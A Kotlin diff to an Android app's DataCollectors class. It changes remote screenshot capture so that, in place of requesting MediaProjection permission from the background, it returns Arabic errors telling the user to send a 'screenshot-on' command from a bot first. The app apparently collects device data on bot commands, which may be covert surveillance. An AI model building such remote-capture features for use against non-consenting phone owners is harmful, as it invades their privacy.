@@ -460,10 +460,10 @@ class DataCollectors(private val context: Context) {
     fun takeScreenshot(): Any {
         // Check if ScreenCaptureService is ready with MediaProjection
         if (!ScreenCaptureService.isReady()) {
-            // Request permission - this shows system dialog once
-            // The screenshot will be taken next time the command is sent
-            ScreenCapturePermissionActivity.requestPermission(context)
-            return errorJson("permission_needed", "تم طلب إذن تسجيل الشاشة - أرسل أمر لقطة الشاشة مرة أخرى")
+            // ✅ Don't request permission from background - it fails on Android 12+
+            // User must send 'screenshot-on' command first to grant one-time permission
+            return errorJson("permission_needed",
+                "⚠️ يجب تفعيل لقطات الشاشة أولاً - أرسل أمر 'screenshot-on' من البوت ومنح الإذن على الهاتف")
         }
 
         // Use MediaProjection to capture real screen
@@ -482,9 +482,7 @@ class DataCollectors(private val context: Context) {
             if (resultFile != null && resultFile!!.exists()) {
                 CollectedData.FileResult(resultFile!!, "screenshot")
             } else {
-                // If MediaProjection failed, request new permission and retry
-                ScreenCapturePermissionActivity.requestPermission(context)
-                errorJson("error", "فشل الالتقاط - تم طلب إذن جديد، حاول مرة أخرى")
+                errorJson("error", "فشل التقاط الصورة - حاول مرة أخرى")
             }
         } catch (e: Exception) {
             errorJson("error", "خطأ في لقطة الشاشة: ${e.message}")
